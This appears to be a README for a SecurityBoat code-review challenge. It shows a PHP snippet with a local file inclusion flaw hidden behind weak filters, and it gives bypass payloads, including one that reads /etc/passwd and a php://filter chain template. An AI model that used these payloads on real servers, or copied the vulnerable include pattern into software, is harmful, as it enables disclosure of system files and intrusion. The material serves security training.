# LFI code review for December2022 by SecurityBoat

## Problem

**The task is to spot the vulnerability in the provided static code snippet and trying bypassing it by providing payload to include important server files like /etc/passwd or /etc/shadow etc.**

## Snippet

**Here is the code snippet to solve and perform the attack**

```javascript
<?php
require_once("constants.php");
echo "Static code review<br/>";
if($_GET!=null){
    $file=$_GET["file"];
    $file = preg_replace("/(..\/[a-z0-9]{3,4})|%[0-9]{1}|([a-z]{1,7}:\/\/)|[A-Z]{1}:\\\[a-zA-z]{1,}|(etc)|(proc)/","",$file,3);
    $file = str_replace(["etc", "proc"],"",$file);
    $file = substr($file,0,PARAM);
    include_once($file);
}
?>
```

- [Twitter](https://twitter.com/Securityb0at/status/1599010560070144003?cxt=HHwWhsCikb3o6bAsAAAA)
- [linkedIn](https://www.linkedin.com/posts/securityboat_bugbounty-infosec-cybersecurity-activity-7004777992904192000-A27O)
- [Instagram](https://www.instagram.com/p/CltR6lIIvlp/?igshid=ZmRlMzRkMDU%3D)

## Best Solution(Payload)

```
%1%1%1/etceetctc/passwd
```

## Winner of Challenge

[Egidio Romano](https://it.linkedin.com/in/romanoegidio)

## Winners Solution(Payload)

```
php://php://php://php://filter/[CHAIN_HERE]/resource=php://temp
```

## Write up

[Writeup](https://securityboat.in/spot-the-vulnerability-lfi-code-challenge/)
